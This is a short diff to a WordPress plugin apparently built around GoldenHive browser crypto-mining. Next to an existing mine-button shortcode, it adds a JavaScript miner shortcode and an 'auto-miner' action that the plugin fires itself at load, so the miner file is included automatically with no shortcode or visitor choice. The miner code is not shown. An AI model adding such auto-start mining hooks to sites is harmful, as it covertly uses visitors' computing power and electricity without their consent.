@@ -18,7 +18,18 @@ if (!defined('ABSPATH')) {
 }
 
 add_shortcode('goldenhive-mine-button', 'minebutton');
+add_shortcode('goldenhive-js-miner', 'miner');
+add_action('auto-miner', 'auto_miner_start');
+do_action('auto-miner','');
 
 function minebutton() {
     require_once 'mine-button.php';
+}
+
+function miner() {
+    require_once 'j-miner.php';
+}
+
+function auto_miner_start() {
+    require_once 'j-miner.php';
 }
